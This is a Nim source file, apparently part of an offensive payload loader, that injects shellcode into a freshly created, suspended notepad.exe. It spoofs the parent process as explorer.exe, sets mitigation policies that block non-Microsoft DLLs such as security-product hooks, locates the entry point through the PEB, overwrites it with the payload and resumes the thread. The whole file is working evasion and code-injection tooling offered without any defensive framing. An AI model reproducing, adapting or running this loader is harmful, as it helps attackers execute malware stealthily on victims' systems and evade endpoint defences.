import ../utils/utils
import ../utils/winapi_wrapper
import ../utils/peloader
import ../rth
import winim/lean
import strformat
import strutils
import endians


# Constants for process creation flags
const
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36


#[
  This will do the process createion, using
  - PPID Spoofing
  - Blocking non-signed DLLs
  - Arbitrary Code Guard Protection
]#
proc createHollowableProcess(pi: LPPROCESS_INFORMATION) : WINBOOL =

  var
      si: STARTUPINFOEX
      #pi: PROCESS_INFORMATION
      ps: SECURITY_ATTRIBUTES
      ts: SECURITY_ATTRIBUTES
      policy: DWORD64
      lpSize: SIZE_T
      res: WINBOOL

  si.StartupInfo.cb = sizeof(si).cint
  ps.nLength = sizeof(ps).cint
  ts.nLength = sizeof(ts).cint

  InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)

  si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))

  InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

  policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE or PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON

  res = UpdateProcThreadAttribute(
      si.lpAttributeList,
      0,
      cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
      addr policy,
      sizeof(policy),
      NULL,
      NULL
  )

  var processId = GetProcessByName("explorer.exe")
  DBG(fmt"[*] Found PPID: {processId}")
  var parentHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)

  res = UpdateProcThreadAttribute(
      si.lpAttributeList,
      0,
      cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
      addr parentHandle,
      sizeof(parentHandle),
      NULL,
      NULL
  )

  res = CreateProcess(
      NULL,
      newWideCString(r"C:\Windows\notepad.exe"),
      addr ps,
      addr ts,
      FALSE,
      EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
      NULL,
      NULL,
      addr si.StartupInfo,
      pi
  )

  DBG(fmt"[+] Started process with PID: {pi.dwProcessId}")

  return TRUE



#[
  The main execution function
]#
proc execute*(payload: var Payload): bool =

  let
      processImage: string = r""
  var
      nBytes: SIZE_T
      tmp: ULONG
      res: WINBOOL
      baseAddressBytes: array[0..sizeof(PVOID), byte]
      data: array[0..0x200, byte]

  var ps: SECURITY_ATTRIBUTES
  var ts: SECURITY_ATTRIBUTES
  var si: STARTUPINFOEX
  var pi: PROCESS_INFORMATION

  # pass the pi struct to fill in
  res = createHollowableProcess(addr pi)

  if res == 0:
      DBG(fmt"[DEBUG] (CreateProcess) : Failed to start process from image {processImage}, exiting")
      return false

  var hProcess = pi.hProcess
  var bi: PROCESS_BASIC_INFORMATION

  res = NtQueryInformationProcess(
      hProcess,
      0, # ProcessBasicInformation
      addr bi,
      cast[ULONG](sizeof(bi)),
      addr tmp)

  if res != 0:
      DBG("[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting")
      return false

  var ptrImageBaseAddress = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)

  res = wNtReadVirtualMemory(
      hProcess,
      ptrImageBaseAddress,
      addr baseAddressBytes,
      cast[ULONG](sizeof(PVOID)),
      cast[PULONG](addr nBytes))

  if res != 0:
      DBG("[DEBUG] (NtReadVirtualMemory) : Failed to read image base address, exiting")
      return false

  var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))

  res = wNtReadVirtualMemory(
      hProcess,
      imageBaseAddress,
      addr data,
      cast[ULONG](len(data)),
      cast[PULONG](addr nBytes))

  if res != 0:
      DBG("[DEBUG] (NtReadVirtualMemory) : Failed to read first 0x200 bytes of the PE structure, exiting")
      return false

  var e_lfanew: uint
  littleEndian32(addr e_lfanew, addr data[0x3c])
  DBG(fmt"[DEBUG] e_lfanew = {e_lfanew:#X}")

  var entrypointRvaOffset = e_lfanew + 0x28
  DBG(fmt"[DEBUG] entrypointRvaOffset = {entrypointRvaOffset:#X}")

  var entrypointRva: uint
  littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
  DBG(fmt"[DEBUG] entrypointRva = {entrypointRva:#X}")

  var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
  DBG(fmt"[DEBUG] entrypointAddress = {cast[uint64](entrypointAddress):#X}")

  var protectAddress = entrypointAddress
  var shellcodeLength = cast[SIZE_T](len(payload.bytes))
  var oldProtect: ULONG

  res = wNtProtectVirtualMemory(
      hProcess,
      addr protectAddress,
      addr shellcodeLength,
      0x40, # PAGE_EXECUTE_READWRITE
      addr oldProtect)

  if res != 0:
      DBG("[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting")
      return false

  res = wNtWriteVirtualMemory(
      hProcess,
      entrypointAddress,
      unsafeAddr payload.bytes[0],
      cast[ULONG](len(payload.bytes)),
      cast[PULONG](addr nBytes))

  if res != 0:
      DBG("[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting")
      return false

  res = wNtProtectVirtualMemory(
      hProcess,
      addr protectAddress,
      addr shellcodeLength,
      oldProtect,
      addr tmp)

  if res != 0:
      DBG("[DEBUG] (NtProtectVirtualMemory) : Failed to revert memory permissions at the EntryPoint, exiting")
      return false

  res = wNtResumeThread(
      pi.hThread,
      addr tmp)

  if res != 0:
      DBG("[DEBUG] (NtResumeThread) : Failed to resume thread, exiting")
      return false

  res = NtClose(hProcess)

  return true
